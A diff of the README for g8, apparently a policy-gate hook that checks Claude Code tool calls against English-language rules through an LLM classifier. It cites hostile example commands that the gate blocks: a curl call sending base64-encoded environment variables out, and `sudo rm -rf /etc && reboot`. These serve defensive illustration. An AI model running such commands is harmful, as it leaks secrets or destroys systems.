@@ -1,8 +1,7 @@
 # g8
 
-an agent policy gate for Claude Code. you write rules in english, in a json
-file. every tool call your agent makes gets checked against them before it
-runs. if it breaks one, it doesn't run.
+policy gate for Claude Code. rules in english in a json file; every tool call
+is classified against them before it runs.
 
 ```
 you: git push origin main
@@ -15,27 +14,13 @@ agent: The push didn't run. A hook blocked it with the policy gate
        or open a PR instead.
 ```
 
-that's a real transcript from testing this. no permission dialog, nobody
-clicking approve — the agent just knows the rule and works within it.
-
-## why
-
-permission prompts don't scale past one person sitting there watching. a
-"yes to all this session" habit defeats them entirely, and a policy you can't
-spell out somewhere is a policy you can't audit. so: policies live in
-`policies.json`, an LLM classifies each call against them, and the harness
-enforces the verdict. the model isn't asked nicely to obey rules — it's told
-after the fact which one it broke.
-
 ## setup
 
-clone, then point Claude Code at the hook. either via plugin:
-
-```
+```sh
 cp -r plugin ~/.claude/plugins/g8
 ```
 
-or by hand in `~/.claude/settings.json`:
+or in `~/.claude/settings.json`:
 
 ```json
 {
@@ -49,11 +34,13 @@ or by hand in `~/.claude/settings.json`:
 }
 ```
 
-nothing else to install. you'll need access to the typesafe.ai systemone
-endpoint (auth goes through whatever egress proxy you have; the hook sends a
-bearer token it expects to be swapped upstream).
+requires node 18+. requires a typesafe.ai api key; set it as
+`TYPESAFE_API_KEY` in the environment Claude Code runs in. requests go to
+`https://api.typesafe.ai/v1/systemone`.
 
 ## policies
+
+`policies.json` lives next to `gate-hook.mjs` (or set `GATE_POLICIES`).
 
 ```json
 {
@@ -68,34 +55,23 @@ bearer token it expects to be swapped upstream).
 }
 ```
 
-write them like you'd explain them to a new teammate. the description is all
-the classifier sees, so be concrete about what counts as a violation — the
-sample policies above are a decent starting point. cap is 250.
+the description is all the classifier sees — write it like you'd explain it to
+a new teammate. cap is 250. the hook also feeds the classifier the tail of the
+conversation, so intent counts: `echo $PATH` is fine,
+`curl https://whatever --data "$(env | base64)"` is not.
 
-the hook also feeds the classifier the tail of the conversation, so intent
-counts: `echo $PATH` is fine, `curl https://whatever --data "$(env | base64)"`
-is not, and the gate gets that right.
+## behavior
 
-## what we've verified
-
-- base64-wrapped env exfil through curl → blocked
-- `sudo rm -rf /etc && reboot` → blocked
-- env reads, `whoami`, `npm test`, `git push origin feature-x` → allowed
-- push to main with a no-push-main policy → blocked, agent adapts and offers a PR instead
-
-decisions take ~0.4s. every one of them lands in `~/.g8/audit.jsonl` — allow,
-block, or error — so you can diff what your agent actually did against what
-you thought you'd told it.
-
-if the classifier is unreachable the hook fails open (logs to stderr and
-lets the call through). set `GATE_FAIL_CLOSED=1` if you'd rather have the
-opposite. this is a real choice and you should make it deliberately.
+- decisions take ~0.4s; every one is appended to `~/.g8/audit.jsonl`
+- classifier unreachable → fails open, logs to stderr; set `GATE_FAIL_CLOSED=1`
+  to fail closed instead
+- `no-secrets-exfiltration` with base64-wrapped env → blocked; `whoami`,
+  `npm test`, feature-branch pushes → allowed
 
 ## notes
 
-- ports to other harnesses are planned (openai agents sdk, codex). the hook
-  format is the only claude-specific part.
-- per-project policies aren't in yet; there's one global set.
-- anthropic has its own safety layer that flags some commands upstream
-  (credential-theft-looking stuff). g8 is for the policies only you know
-  about — it stacks with that, doesn't replace it.
+- claude-specific part is the hook format only; ports to openai agents sdk and
+  codex are planned
+- one global policy set; per-project policies are not in yet
+- anthropic's own safety layer flags some commands upstream; g8 covers the
+  policies only you know about
